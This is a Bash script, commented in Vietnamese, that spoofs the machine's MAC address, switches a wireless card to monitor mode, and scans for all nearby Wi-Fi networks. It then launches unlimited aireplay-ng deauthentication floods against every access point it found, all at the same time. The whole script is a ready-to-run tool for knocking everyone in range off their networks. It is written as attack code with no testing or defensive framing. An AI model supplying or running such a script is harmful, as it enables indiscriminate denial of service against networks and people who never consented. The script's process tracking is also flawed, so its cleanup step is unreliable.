#!/bin/bash

# Cấu hình
INTERFACE="wlan0"
MONITOR_INTERFACE="${INTERFACE}mon"
DURATION=100000
SCAN_TIME=20
CSV_FILE="/tmp/scan-01.csv"

# Hàm dọn dẹp
cleanup() {
    echo "Dừng tất cả tiến trình và khôi phục hệ thống..."
    for pid in $pids; do
        kill -9 "$pid" 2>/dev/null
    done
    sleep 1
    echo "Tắt monitor mode cho $MONITOR_INTERFACE..."
    airmon-ng stop "$MONITOR_INTERFACE"
    echo "Khôi phục địa chỉ MAC ban đầu..."
    macchanger -p "$INTERFACE" >/dev/null 2>&1
    echo "Khởi động lại NetworkManager..."
    service NetworkManager restart
    echo "Xóa file tạm..."
    rm -f /tmp/scan-01.*
    echo "Hoàn tất!"
    exit 0
}

trap cleanup SIGINT SIGTERM

# Kiểm tra quyền root
if [[ $EUID -ne 0 ]]; then
   echo "[ERROR] Vui lòng chạy script với quyền root (sudo)."
   exit 1
fi

# Dừng các tiến trình xung đột
echo "Dừng các tiến trình xung đột..."
airmon-ng check kill

# Đổi MAC address ngẫu nhiên
echo "Đổi MAC address ngẫu nhiên cho $INTERFACE..."
if macchanger -r "$INTERFACE"; then
    echo "MAC mới đã được thiết lập."
else
    echo "[WARNING] Không thể đổi MAC. Tiếp tục..."
fi

# Chuyển sang monitor mode
echo "Chuyển $INTERFACE sang monitor mode..."
airmon-ng start "$INTERFACE"
if ! iwconfig 2>&1 | grep -q "$MONITOR_INTERFACE"; then
    echo "[ERROR] Không thể chuyển sang monitor mode. Kiểm tra card mạng."
    cleanup
fi

# Quét mạng Wi-Fi
echo "Quét mạng Wi-Fi trong $SCAN_TIME giây..."
timeout "$SCAN_TIME" airodump-ng "$MONITOR_INTERFACE" --band abg -w /tmp/scan --output-format csv &
wait $!
echo "Quét hoàn tất."

# Kiểm tra file CSV
if [[ ! -f "$CSV_FILE" ]]; then
    echo "[ERROR] Không tìm thấy file $CSV_FILE. Quét thất bại."
    cleanup
fi
echo "File CSV: $CSV_FILE đã được tạo."

# Lọc và đếm số AP
ap_count=$(grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | wc -l)
if [[ $ap_count -eq 0 ]]; then
    echo "[ERROR] File CSV không chứa dữ liệu AP."
    cleanup
fi
echo "Tìm thấy $ap_count mạng Wi-Fi."

# Tấn công đồng thời tất cả mạng Wi-Fi
echo "Bắt đầu tấn công tất cả mạng Wi-Fi đồng thời... (Nhấn 'q' để dừng)"

pids=""
grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | while IFS=, read -r bssid time1 time2 channel speed privacy cipher auth power beacons iv lan idlength essid key; do
    bssid=$(echo "$bssid" | tr -d ' ')
    channel=$(echo "$channel" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^[[:space:]]*//')

    if [[ -z "$bssid" || ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "[WARNING] BSSID không hợp lệ: $bssid"
        continue
    fi
    if [[ -z "$channel" || ! "$channel" =~ ^[0-9]+$ || $channel -lt 1 || $channel -gt 165 ]]; then
        echo "[WARNING] Channel không hợp lệ: $channel (BSSID: $bssid, ESSID: $essid)"
        continue
    fi
    if [[ -z "$essid" ]]; then
        essid="(Hidden SSID)"
    fi

    echo "Tấn công \"$essid\" (BSSID: $bssid, Channel: $channel)"

    (
        iw dev "$MONITOR_INTERFACE" set channel "$channel" || {
            echo "[ERROR] Không thể chuyển sang kênh $channel"
        }
        aireplay-ng --deauth 0 -a "$bssid" "$MONITOR_INTERFACE"
    ) &
    pids="$pids $!"
done

# Giữ tiến trình chạy
echo "Đang tấn công trong $DURATION giây... (Nhấn 'q' để dừng sớm)"
for ((i=0; i<$DURATION; i++)); do
    read -t 1 -n 1 key
    if [[ "$key" == "q" ]]; then
        echo "Người dùng yêu cầu dừng sớm."
        cleanup
    fi
done

echo "Thời gian tấn công kết thúc."
cleanup
